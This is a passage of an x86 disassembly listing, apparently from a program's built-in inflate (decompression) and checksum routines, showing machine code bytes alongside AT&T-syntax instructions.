  407a74:	8b 44 24 24          	mov    0x24(%esp),%eax
  407a78:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407a7e:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407a83:	e9 81 e2 ff ff       	jmp    0x405d09
  407a88:	89 eb                	mov    %ebp,%ebx
  407a8a:	31 f6                	xor    %esi,%esi
  407a8c:	89 fd                	mov    %edi,%ebp
  407a8e:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  407a95:	00 
  407a96:	8b 7c 24 24          	mov    0x24(%esp),%edi
  407a9a:	e9 b1 e8 ff ff       	jmp    0x406350
  407a9f:	89 f0                	mov    %esi,%eax
  407aa1:	89 de                	mov    %ebx,%esi
  407aa3:	89 eb                	mov    %ebp,%ebx
  407aa5:	c1 e8 03             	shr    $0x3,%eax
  407aa8:	89 fd                	mov    %edi,%ebp
  407aaa:	83 ee 03             	sub    $0x3,%esi
  407aad:	8b 7c 24 24          	mov    0x24(%esp),%edi
  407ab1:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  407ab5:	e9 96 e8 ff ff       	jmp    0x406350
  407aba:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407abe:	8b 41 6c             	mov    0x6c(%ecx),%eax
  407ac1:	c7 41 58 06 00 00 00 	movl   $0x6,0x58(%ecx)
  407ac8:	89 41 50             	mov    %eax,0x50(%ecx)
  407acb:	89 c8                	mov    %ecx,%eax
  407acd:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  407ad1:	89 54 24 0c          	mov    %edx,0xc(%esp)
  407ad5:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  407ad9:	89 c1                	mov    %eax,%ecx
  407adb:	83 c0 58             	add    $0x58,%eax
  407ade:	89 44 24 10          	mov    %eax,0x10(%esp)
  407ae2:	8b 41 64             	mov    0x64(%ecx),%eax
  407ae5:	89 44 24 08          	mov    %eax,0x8(%esp)
  407ae9:	8b 41 60             	mov    0x60(%ecx),%eax
  407aec:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
  407af3:	8d 44 41 70          	lea    0x70(%ecx,%eax,2),%eax
  407af7:	89 44 24 04          	mov    %eax,0x4(%esp)
  407afb:	e8 d0 0e 00 00       	call   0x4089d0
  407b00:	85 c0                	test   %eax,%eax
  407b02:	89 44 24 38          	mov    %eax,0x38(%esp)
  407b06:	0f 84 48 e4 ff ff    	je     0x405f54
  407b0c:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407b13:	c7 40 18 bd d6 40 00 	movl   $0x40d6bd,0x18(%eax)
  407b1a:	8b 44 24 24          	mov    0x24(%esp),%eax
  407b1e:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407b24:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407b29:	e9 db e1 ff ff       	jmp    0x405d09
  407b2e:	66 90                	xchg   %ax,%ax
  407b30:	53                   	push   %ebx
  407b31:	83 ec 18             	sub    $0x18,%esp
  407b34:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  407b38:	85 db                	test   %ebx,%ebx
  407b3a:	74 44                	je     0x407b80
  407b3c:	8b 43 1c             	mov    0x1c(%ebx),%eax
  407b3f:	85 c0                	test   %eax,%eax
  407b41:	74 3d                	je     0x407b80
  407b43:	8b 53 24             	mov    0x24(%ebx),%edx
  407b46:	85 d2                	test   %edx,%edx
  407b48:	74 36                	je     0x407b80
  407b4a:	8b 48 34             	mov    0x34(%eax),%ecx
  407b4d:	85 c9                	test   %ecx,%ecx
  407b4f:	74 12                	je     0x407b63
  407b51:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  407b55:	8b 43 28             	mov    0x28(%ebx),%eax
  407b58:	89 04 24             	mov    %eax,(%esp)
  407b5b:	ff d2                	call   *%edx
  407b5d:	8b 53 24             	mov    0x24(%ebx),%edx
  407b60:	8b 43 1c             	mov    0x1c(%ebx),%eax
  407b63:	89 44 24 04          	mov    %eax,0x4(%esp)
  407b67:	8b 43 28             	mov    0x28(%ebx),%eax
  407b6a:	89 04 24             	mov    %eax,(%esp)
  407b6d:	ff d2                	call   *%edx
  407b6f:	c7 43 1c 00 00 00 00 	movl   $0x0,0x1c(%ebx)
  407b76:	31 c0                	xor    %eax,%eax
  407b78:	83 c4 18             	add    $0x18,%esp
  407b7b:	5b                   	pop    %ebx
  407b7c:	c3                   	ret
  407b7d:	8d 76 00             	lea    0x0(%esi),%esi
  407b80:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407b85:	eb f1                	jmp    0x407b78
  407b87:	89 f6                	mov    %esi,%esi
  407b89:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407b90:	57                   	push   %edi
  407b91:	56                   	push   %esi
  407b92:	53                   	push   %ebx
  407b93:	83 ec 10             	sub    $0x10,%esp
  407b96:	8b 44 24 20          	mov    0x20(%esp),%eax
  407b9a:	8b 74 24 24          	mov    0x24(%esp),%esi
  407b9e:	8b 7c 24 28          	mov    0x28(%esp),%edi
  407ba2:	85 c0                	test   %eax,%eax
  407ba4:	74 5e                	je     0x407c04
  407ba6:	8b 58 1c             	mov    0x1c(%eax),%ebx
  407ba9:	85 db                	test   %ebx,%ebx
  407bab:	74 57                	je     0x407c04
  407bad:	85 f6                	test   %esi,%esi
  407baf:	8b 43 2c             	mov    0x2c(%ebx),%eax
  407bb2:	74 37                	je     0x407beb
  407bb4:	85 c0                	test   %eax,%eax
  407bb6:	74 33                	je     0x407beb
  407bb8:	8b 53 30             	mov    0x30(%ebx),%edx
  407bbb:	29 d0                	sub    %edx,%eax
  407bbd:	03 53 34             	add    0x34(%ebx),%edx
  407bc0:	89 34 24             	mov    %esi,(%esp)
  407bc3:	89 44 24 08          	mov    %eax,0x8(%esp)
  407bc7:	89 54 24 04          	mov    %edx,0x4(%esp)
  407bcb:	e8 f8 2b 00 00       	call   0x40a7c8
  407bd0:	8b 43 30             	mov    0x30(%ebx),%eax
  407bd3:	8b 53 34             	mov    0x34(%ebx),%edx
  407bd6:	29 c6                	sub    %eax,%esi
  407bd8:	03 73 2c             	add    0x2c(%ebx),%esi
  407bdb:	89 44 24 08          	mov    %eax,0x8(%esp)
  407bdf:	89 54 24 04          	mov    %edx,0x4(%esp)
  407be3:	89 34 24             	mov    %esi,(%esp)
  407be6:	e8 dd 2b 00 00       	call   0x40a7c8
  407beb:	85 ff                	test   %edi,%edi
  407bed:	74 11                	je     0x407c00
  407bef:	8b 43 2c             	mov    0x2c(%ebx),%eax
  407bf2:	89 07                	mov    %eax,(%edi)
  407bf4:	31 c0                	xor    %eax,%eax
  407bf6:	83 c4 10             	add    $0x10,%esp
  407bf9:	5b                   	pop    %ebx
  407bfa:	5e                   	pop    %esi
  407bfb:	5f                   	pop    %edi
  407bfc:	c3                   	ret
  407bfd:	8d 76 00             	lea    0x0(%esi),%esi
  407c00:	31 c0                	xor    %eax,%eax
  407c02:	eb f2                	jmp    0x407bf6
  407c04:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407c09:	eb eb                	jmp    0x407bf6
  407c0b:	90                   	nop
  407c0c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407c10:	57                   	push   %edi
  407c11:	56                   	push   %esi
  407c12:	53                   	push   %ebx
  407c13:	83 ec 10             	sub    $0x10,%esp
  407c16:	8b 74 24 20          	mov    0x20(%esp),%esi
  407c1a:	8b 7c 24 28          	mov    0x28(%esp),%edi
  407c1e:	85 f6                	test   %esi,%esi
  407c20:	74 7f                	je     0x407ca1
  407c22:	8b 5e 1c             	mov    0x1c(%esi),%ebx
  407c25:	85 db                	test   %ebx,%ebx
  407c27:	74 78                	je     0x407ca1
  407c29:	8b 43 08             	mov    0x8(%ebx),%eax
  407c2c:	85 c0                	test   %eax,%eax
  407c2e:	75 30                	jne    0x407c60
  407c30:	83 3b 0a             	cmpl   $0xa,(%ebx)
  407c33:	74 30                	je     0x407c65
  407c35:	8b 54 24 24          	mov    0x24(%esp),%edx
  407c39:	89 f9                	mov    %edi,%ecx
  407c3b:	89 f0                	mov    %esi,%eax
  407c3d:	01 fa                	add    %edi,%edx
  407c3f:	e8 bc db ff ff       	call   0x405800
  407c44:	85 c0                	test   %eax,%eax
  407c46:	75 68                	jne    0x407cb0
  407c48:	c7 43 0c 01 00 00 00 	movl   $0x1,0xc(%ebx)
  407c4f:	31 c0                	xor    %eax,%eax
  407c51:	83 c4 10             	add    $0x10,%esp
  407c54:	5b                   	pop    %ebx
  407c55:	5e                   	pop    %esi
  407c56:	5f                   	pop    %edi
  407c57:	c3                   	ret
  407c58:	90                   	nop
  407c59:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  407c60:	83 3b 0a             	cmpl   $0xa,(%ebx)
  407c63:	75 3c                	jne    0x407ca1
  407c65:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  407c6c:	00 
  407c6d:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  407c74:	00 
  407c75:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  407c7c:	e8 ef 04 00 00       	call   0x408170
  407c81:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407c85:	89 7c 24 08          	mov    %edi,0x8(%esp)
  407c89:	89 04 24             	mov    %eax,(%esp)
  407c8c:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  407c90:	e8 db 04 00 00       	call   0x408170
  407c95:	39 43 18             	cmp    %eax,0x18(%ebx)
  407c98:	74 9b                	je     0x407c35
  407c9a:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  407c9f:	eb b0                	jmp    0x407c51
  407ca1:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407ca6:	eb a9                	jmp    0x407c51
  407ca8:	90                   	nop
  407ca9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  407cb0:	c7 03 1e 00 00 00    	movl   $0x1e,(%ebx)
  407cb6:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  407cbb:	eb 94                	jmp    0x407c51
  407cbd:	8d 76 00             	lea    0x0(%esi),%esi
  407cc0:	8b 44 24 04          	mov    0x4(%esp),%eax
  407cc4:	8b 54 24 08          	mov    0x8(%esp),%edx
  407cc8:	85 c0                	test   %eax,%eax
  407cca:	74 24                	je     0x407cf0
  407ccc:	8b 40 1c             	mov    0x1c(%eax),%eax
  407ccf:	85 c0                	test   %eax,%eax
  407cd1:	74 1d                	je     0x407cf0
  407cd3:	f6 40 08 02          	testb  $0x2,0x8(%eax)
  407cd7:	74 17                	je     0x407cf0
  407cd9:	89 50 20             	mov    %edx,0x20(%eax)
  407cdc:	c7 42 30 00 00 00 00 	movl   $0x0,0x30(%edx)
  407ce3:	31 c0                	xor    %eax,%eax
  407ce5:	c3                   	ret
  407ce6:	8d 76 00             	lea    0x0(%esi),%esi
  407ce9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407cf0:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407cf5:	c3                   	ret
  407cf6:	8d 76 00             	lea    0x0(%esi),%esi
  407cf9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407d00:	55                   	push   %ebp
  407d01:	57                   	push   %edi
  407d02:	56                   	push   %esi
  407d03:	53                   	push   %ebx
  407d04:	83 ec 14             	sub    $0x14,%esp
  407d07:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  407d0b:	85 db                	test   %ebx,%ebx
  407d0d:	0f 84 e8 00 00 00    	je     0x407dfb
  407d13:	8b 7b 1c             	mov    0x1c(%ebx),%edi
  407d16:	85 ff                	test   %edi,%edi
  407d18:	0f 84 dd 00 00 00    	je     0x407dfb
  407d1e:	8b 4b 04             	mov    0x4(%ebx),%ecx
  407d21:	85 c9                	test   %ecx,%ecx
  407d23:	0f 84 a8 00 00 00    	je     0x407dd1
  407d29:	83 3f 1f             	cmpl   $0x1f,(%edi)
  407d2c:	8d 77 68             	lea    0x68(%edi),%esi
  407d2f:	74 63                	je     0x407d94
  407d31:	8b 57 3c             	mov    0x3c(%edi),%edx
  407d34:	8b 47 38             	mov    0x38(%edi),%eax
  407d37:	c7 07 1f 00 00 00    	movl   $0x1f,(%edi)
  407d3d:	89 d1                	mov    %edx,%ecx
  407d3f:	83 e2 f8             	and    $0xfffffff8,%edx
  407d42:	83 e1 07             	and    $0x7,%ecx
  407d45:	89 57 3c             	mov    %edx,0x3c(%edi)
  407d48:	d3 e0                	shl    %cl,%eax
  407d4a:	83 fa 07             	cmp    $0x7,%edx
  407d4d:	89 d1                	mov    %edx,%ecx
  407d4f:	89 47 38             	mov    %eax,0x38(%edi)
  407d52:	0f 86 98 00 00 00    	jbe    0x407df0
  407d58:	83 e9 08             	sub    $0x8,%ecx
  407d5b:	8d 54 24 10          	lea    0x10(%esp),%edx
  407d5f:	c1 e9 03             	shr    $0x3,%ecx
  407d62:	83 c1 01             	add    $0x1,%ecx
  407d65:	89 d6                	mov    %edx,%esi
  407d67:	8d 2c 0a             	lea    (%edx,%ecx,1),%ebp
  407d6a:	88 06                	mov    %al,(%esi)
  407d6c:	83 c6 01             	add    $0x1,%esi
  407d6f:	c1 e8 08             	shr    $0x8,%eax
  407d72:	39 ee                	cmp    %ebp,%esi
  407d74:	75 f4                	jne    0x407d6a
  407d76:	89 47 38             	mov    %eax,0x38(%edi)
  407d79:	c7 47 3c 00 00 00 00 	movl   $0x0,0x3c(%edi)
  407d80:	8d 77 68             	lea    0x68(%edi),%esi
  407d83:	c7 47 68 00 00 00 00 	movl   $0x0,0x68(%edi)
  407d8a:	89 f0                	mov    %esi,%eax
  407d8c:	e8 df d9 ff ff       	call   0x405770
  407d91:	8b 4b 04             	mov    0x4(%ebx),%ecx
  407d94:	8b 13                	mov    (%ebx),%edx
  407d96:	89 f0                	mov    %esi,%eax
  407d98:	e8 d3 d9 ff ff       	call   0x405770
  407d9d:	29 43 04             	sub    %eax,0x4(%ebx)
  407da0:	01 03                	add    %eax,(%ebx)
  407da2:	03 43 08             	add    0x8(%ebx),%eax
  407da5:	83 7f 68 04          	cmpl   $0x4,0x68(%edi)
  407da9:	89 c6                	mov    %eax,%esi
  407dab:	89 43 08             	mov    %eax,0x8(%ebx)
  407dae:	75 32                	jne    0x407de2
  407db0:	8b 6b 14             	mov    0x14(%ebx),%ebp
  407db3:	89 1c 24             	mov    %ebx,(%esp)
  407db6:	e8 25 dc ff ff       	call   0x4059e0
  407dbb:	89 73 08             	mov    %esi,0x8(%ebx)
  407dbe:	31 c0                	xor    %eax,%eax
  407dc0:	89 6b 14             	mov    %ebp,0x14(%ebx)
  407dc3:	c7 07 0b 00 00 00    	movl   $0xb,(%edi)
  407dc9:	83 c4 14             	add    $0x14,%esp
  407dcc:	5b                   	pop    %ebx
  407dcd:	5e                   	pop    %esi
  407dce:	5f                   	pop    %edi
  407dcf:	5d                   	pop    %ebp
  407dd0:	c3                   	ret
  407dd1:	83 7f 3c 07          	cmpl   $0x7,0x3c(%edi)
  407dd5:	0f 87 4e ff ff ff    	ja     0x407d29
  407ddb:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  407de0:	eb e7                	jmp    0x407dc9
  407de2:	83 c4 14             	add    $0x14,%esp
  407de5:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  407dea:	5b                   	pop    %ebx
  407deb:	5e                   	pop    %esi
  407dec:	5f                   	pop    %edi
  407ded:	5d                   	pop    %ebp
  407dee:	c3                   	ret
  407def:	90                   	nop
  407df0:	31 c9                	xor    %ecx,%ecx
  407df2:	8d 54 24 10          	lea    0x10(%esp),%edx
  407df6:	e9 85 ff ff ff       	jmp    0x407d80
  407dfb:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407e00:	eb c7                	jmp    0x407dc9
  407e02:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  407e09:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407e10:	8b 44 24 04          	mov    0x4(%esp),%eax
  407e14:	85 c0                	test   %eax,%eax
  407e16:	74 28                	je     0x407e40
  407e18:	8b 50 1c             	mov    0x1c(%eax),%edx
  407e1b:	85 d2                	test   %edx,%edx
  407e1d:	74 21                	je     0x407e40
  407e1f:	31 c0                	xor    %eax,%eax
  407e21:	83 3a 0d             	cmpl   $0xd,(%edx)
  407e24:	74 0a                	je     0x407e30
  407e26:	f3 c3                	repz ret
  407e28:	90                   	nop
  407e29:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  407e30:	8b 52 3c             	mov    0x3c(%edx),%edx
  407e33:	31 c0                	xor    %eax,%eax
  407e35:	85 d2                	test   %edx,%edx
  407e37:	0f 94 c0             	sete   %al
  407e3a:	c3                   	ret
  407e3b:	90                   	nop
  407e3c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407e40:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  407e45:	c3                   	ret
  407e46:	8d 76 00             	lea    0x0(%esi),%esi
  407e49:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407e50:	55                   	push   %ebp
  407e51:	57                   	push   %edi
  407e52:	56                   	push   %esi
  407e53:	53                   	push   %ebx
  407e54:	83 ec 2c             	sub    $0x2c,%esp
  407e57:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  407e5b:	8b 74 24 44          	mov    0x44(%esp),%esi
  407e5f:	85 db                	test   %ebx,%ebx
  407e61:	0f 84 a9 01 00 00    	je     0x408010
  407e67:	85 f6                	test   %esi,%esi
  407e69:	0f 84 a1 01 00 00    	je     0x408010
  407e6f:	8b 6e 1c             	mov    0x1c(%esi),%ebp
  407e72:	85 ed                	test   %ebp,%ebp
  407e74:	0f 84 96 01 00 00    	je     0x408010
  407e7a:	8b 46 20             	mov    0x20(%esi),%eax
  407e7d:	85 c0                	test   %eax,%eax
  407e7f:	0f 84 8b 01 00 00    	je     0x408010
  407e85:	8b 56 24             	mov    0x24(%esi),%edx
  407e88:	85 d2                	test   %edx,%edx
  407e8a:	0f 84 80 01 00 00    	je     0x408010
  407e90:	c7 44 24 08 cc 1b 00 	movl   $0x1bcc,0x8(%esp)
  407e97:	00 
  407e98:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  407e9f:	00 
  407ea0:	8b 56 28             	mov    0x28(%esi),%edx
  407ea3:	89 14 24             	mov    %edx,(%esp)
  407ea6:	ff d0                	call   *%eax
  407ea8:	85 c0                	test   %eax,%eax
  407eaa:	89 c2                	mov    %eax,%edx
  407eac:	0f 84 65 01 00 00    	je     0x408017
  407eb2:	8b 45 34             	mov    0x34(%ebp),%eax
  407eb5:	85 c0                	test   %eax,%eax
  407eb7:	0f 84 43 01 00 00    	je     0x408000
  407ebd:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  407ec4:	00 
  407ec5:	8b 4d 24             	mov    0x24(%ebp),%ecx
  407ec8:	b8 01 00 00 00       	mov    $0x1,%eax
  407ecd:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  407ed1:	d3 e0                	shl    %cl,%eax
  407ed3:	89 44 24 04          	mov    %eax,0x4(%esp)
  407ed7:	8b 46 28             	mov    0x28(%esi),%eax
  407eda:	89 04 24             	mov    %eax,(%esp)
  407edd:	ff 56 20             	call   *0x20(%esi)
  407ee0:	85 c0                	test   %eax,%eax
  407ee2:	89 44 24 18          	mov    %eax,0x18(%esp)
  407ee6:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  407eea:	0f 84 2e 01 00 00    	je     0x40801e
  407ef0:	8b 06                	mov    (%esi),%eax
  407ef2:	8d 7a 04             	lea    0x4(%edx),%edi
  407ef5:	89 d1                	mov    %edx,%ecx
  407ef7:	83 e7 fc             	and    $0xfffffffc,%edi
  407efa:	89 03                	mov    %eax,(%ebx)
  407efc:	8b 46 04             	mov    0x4(%esi),%eax
  407eff:	29 f9                	sub    %edi,%ecx
  407f01:	89 43 04             	mov    %eax,0x4(%ebx)
  407f04:	8b 46 08             	mov    0x8(%esi),%eax
  407f07:	89 43 08             	mov    %eax,0x8(%ebx)
  407f0a:	8b 46 0c             	mov    0xc(%esi),%eax
  407f0d:	89 43 0c             	mov    %eax,0xc(%ebx)
  407f10:	8b 46 10             	mov    0x10(%esi),%eax
  407f13:	89 43 10             	mov    %eax,0x10(%ebx)
  407f16:	8b 46 14             	mov    0x14(%esi),%eax
  407f19:	89 43 14             	mov    %eax,0x14(%ebx)
  407f1c:	8b 46 18             	mov    0x18(%esi),%eax
  407f1f:	89 43 18             	mov    %eax,0x18(%ebx)
  407f22:	8b 46 1c             	mov    0x1c(%esi),%eax
  407f25:	89 43 1c             	mov    %eax,0x1c(%ebx)
  407f28:	8b 46 20             	mov    0x20(%esi),%eax
  407f2b:	89 43 20             	mov    %eax,0x20(%ebx)
  407f2e:	8b 46 24             	mov    0x24(%esi),%eax
  407f31:	89 43 24             	mov    %eax,0x24(%ebx)
  407f34:	8b 46 28             	mov    0x28(%esi),%eax
  407f37:	89 43 28             	mov    %eax,0x28(%ebx)
  407f3a:	8b 46 2c             	mov    0x2c(%esi),%eax
  407f3d:	89 43 2c             	mov    %eax,0x2c(%ebx)
  407f40:	8b 46 30             	mov    0x30(%esi),%eax
  407f43:	89 43 30             	mov    %eax,0x30(%ebx)
  407f46:	8b 46 34             	mov    0x34(%esi),%eax
  407f49:	89 ee                	mov    %ebp,%esi
  407f4b:	29 ce                	sub    %ecx,%esi
  407f4d:	81 c1 cc 1b 00 00    	add    $0x1bcc,%ecx
  407f53:	c1 e9 02             	shr    $0x2,%ecx
  407f56:	89 43 34             	mov    %eax,0x34(%ebx)
  407f59:	8b 45 00             	mov    0x0(%ebp),%eax
  407f5c:	89 02                	mov    %eax,(%edx)
  407f5e:	8b 85 c8 1b 00 00    	mov    0x1bc8(%ebp),%eax
  407f64:	89 82 c8 1b 00 00    	mov    %eax,0x1bc8(%edx)
  407f6a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407f6c:	8b 45 4c             	mov    0x4c(%ebp),%eax
  407f6f:	8d 8d 30 05 00 00    	lea    0x530(%ebp),%ecx
  407f75:	39 c8                	cmp    %ecx,%eax
  407f77:	73 57                	jae    0x407fd0
  407f79:	8b 45 6c             	mov    0x6c(%ebp),%eax
  407f7c:	8b 7c 24 18          	mov    0x18(%esp),%edi
  407f80:	29 c8                	sub    %ecx,%eax
  407f82:	c1 f8 02             	sar    $0x2,%eax
  407f85:	85 ff                	test   %edi,%edi
  407f87:	8d 84 82 30 05 00 00 	lea    0x530(%edx,%eax,4),%eax
  407f8e:	89 42 6c             	mov    %eax,0x6c(%edx)
  407f91:	74 25                	je     0x407fb8
  407f93:	8b 4d 24             	mov    0x24(%ebp),%ecx
  407f96:	b8 01 00 00 00       	mov    $0x1,%eax
  407f9b:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  407f9f:	d3 e0                	shl    %cl,%eax
  407fa1:	8b 4d 34             	mov    0x34(%ebp),%ecx
  407fa4:	89 3c 24             	mov    %edi,(%esp)
  407fa7:	89 44 24 08          	mov    %eax,0x8(%esp)
  407fab:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  407faf:	e8 14 28 00 00       	call   0x40a7c8
  407fb4:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  407fb8:	8b 44 24 18          	mov    0x18(%esp),%eax
  407fbc:	89 42 34             	mov    %eax,0x34(%edx)
  407fbf:	89 53 1c             	mov    %edx,0x1c(%ebx)
  407fc2:	31 c0                	xor    %eax,%eax
  407fc4:	83 c4 2c             	add    $0x2c,%esp
  407fc7:	5b                   	pop    %ebx
  407fc8:	5e                   	pop    %esi
  407fc9:	5f                   	pop    %edi
  407fca:	5d                   	pop    %ebp
  407fcb:	c3                   	ret
  407fcc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407fd0:	8d b5 bc 1b 00 00    	lea    0x1bbc(%ebp),%esi
  407fd6:	39 f0                	cmp    %esi,%eax
  407fd8:	77 9f                	ja     0x407f79
  407fda:	29 c8                	sub    %ecx,%eax
  407fdc:	c1 f8 02             	sar    $0x2,%eax
  407fdf:	8d 84 82 30 05 00 00 	lea    0x530(%edx,%eax,4),%eax
  407fe6:	89 42 4c             	mov    %eax,0x4c(%edx)
  407fe9:	8b 45 50             	mov    0x50(%ebp),%eax
  407fec:	29 c8                	sub    %ecx,%eax
  407fee:	c1 f8 02             	sar    $0x2,%eax
  407ff1:	8d 84 82 30 05 00 00 	lea    0x530(%edx,%eax,4),%eax
  407ff8:	89 42 50             	mov    %eax,0x50(%edx)
  407ffb:	e9 79 ff ff ff       	jmp    0x407f79
  408000:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  408007:	00 
  408008:	e9 e3 fe ff ff       	jmp    0x407ef0
  40800d:	8d 76 00             	lea    0x0(%esi),%esi
  408010:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  408015:	eb ad                	jmp    0x407fc4
  408017:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  40801c:	eb a6                	jmp    0x407fc4
  40801e:	89 54 24 04          	mov    %edx,0x4(%esp)
  408022:	8b 46 28             	mov    0x28(%esi),%eax
  408025:	89 04 24             	mov    %eax,(%esp)
  408028:	ff 56 24             	call   *0x24(%esi)
  40802b:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  408030:	eb 92                	jmp    0x407fc4
  408032:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  408039:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408040:	8b 44 24 04          	mov    0x4(%esp),%eax
  408044:	85 c0                	test   %eax,%eax
  408046:	74 18                	je     0x408060
  408048:	8b 40 1c             	mov    0x1c(%eax),%eax
  40804b:	85 c0                	test   %eax,%eax
  40804d:	74 11                	je     0x408060
  40804f:	c7 80 c0 1b 00 00 01 	movl   $0x1,0x1bc0(%eax)
  408056:	00 00 00 
  408059:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  40805e:	c3                   	ret
  40805f:	90                   	nop
  408060:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  408065:	c3                   	ret
  408066:	8d 76 00             	lea    0x0(%esi),%esi
  408069:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  408070:	53                   	push   %ebx
  408071:	8b 44 24 08          	mov    0x8(%esp),%eax
  408075:	85 c0                	test   %eax,%eax
  408077:	74 47                	je     0x4080c0
  408079:	8b 48 1c             	mov    0x1c(%eax),%ecx
  40807c:	85 c9                	test   %ecx,%ecx
  40807e:	74 40                	je     0x4080c0
  408080:	8b 91 c4 1b 00 00    	mov    0x1bc4(%ecx),%edx
  408086:	8b 19                	mov    (%ecx),%ebx
  408088:	c1 e2 10             	shl    $0x10,%edx
  40808b:	83 fb 0f             	cmp    $0xf,%ebx
  40808e:	74 10                	je     0x4080a0
  408090:	31 c0                	xor    %eax,%eax
  408092:	83 fb 18             	cmp    $0x18,%ebx
  408095:	74 19                	je     0x4080b0
  408097:	01 d0                	add    %edx,%eax
  408099:	5b                   	pop    %ebx
  40809a:	c3                   	ret
  40809b:	90                   	nop
  40809c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4080a0:	8b 41 40             	mov    0x40(%ecx),%eax
  4080a3:	01 d0                	add    %edx,%eax
  4080a5:	eb f2                	jmp    0x408099
  4080a7:	89 f6                	mov    %esi,%esi
  4080a9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4080b0:	8b 81 c8 1b 00 00    	mov    0x1bc8(%ecx),%eax
  4080b6:	2b 41 40             	sub    0x40(%ecx),%eax
  4080b9:	01 d0                	add    %edx,%eax
  4080bb:	eb dc                	jmp    0x408099
  4080bd:	8d 76 00             	lea    0x0(%esi),%esi
  4080c0:	b8 00 00 ff ff       	mov    $0xffff0000,%eax
  4080c5:	5b                   	pop    %ebx
  4080c6:	c3                   	ret
  4080c7:	90                   	nop
  4080c8:	90                   	nop
  4080c9:	90                   	nop
  4080ca:	90                   	nop
  4080cb:	90                   	nop
  4080cc:	90                   	nop
  4080cd:	90                   	nop
  4080ce:	90                   	nop
  4080cf:	90                   	nop
  4080d0:	55                   	push   %ebp
  4080d1:	57                   	push   %edi
  4080d2:	89 c7                	mov    %eax,%edi
  4080d4:	56                   	push   %esi
  4080d5:	89 c8                	mov    %ecx,%eax
  4080d7:	be 71 80 07 80       	mov    $0x80078071,%esi
  4080dc:	53                   	push   %ebx
  4080dd:	89 d3                	mov    %edx,%ebx
  4080df:	0f b7 ef             	movzwl %di,%ebp
  4080e2:	f7 ee                	imul   %esi
  4080e4:	89 c8                	mov    %ecx,%eax
  4080e6:	c1 ef 10             	shr    $0x10,%edi
  4080e9:	c1 f8 1f             	sar    $0x1f,%eax
  4080ec:	83 ec 04             	sub    $0x4,%esp
  4080ef:	01 ca                	add    %ecx,%edx
  4080f1:	c1 fa 0f             	sar    $0xf,%edx
  4080f4:	29 c2                	sub    %eax,%edx
  4080f6:	0f b7 c3             	movzwl %bx,%eax
  4080f9:	c1 eb 10             	shr    $0x10,%ebx
  4080fc:	69 d2 f1 ff 00 00    	imul   $0xfff1,%edx,%edx
  408102:	89 04 24             	mov    %eax,(%esp)
  408105:	01 df                	add    %ebx,%edi
  408107:	29 d1                	sub    %edx,%ecx
  408109:	89 ca                	mov    %ecx,%edx
  40810b:	0f af cd             	imul   %ebp,%ecx
  40810e:	29 d7                	sub    %edx,%edi
  408110:	89 c8                	mov    %ecx,%eax
  408112:	f7 e6                	mul    %esi
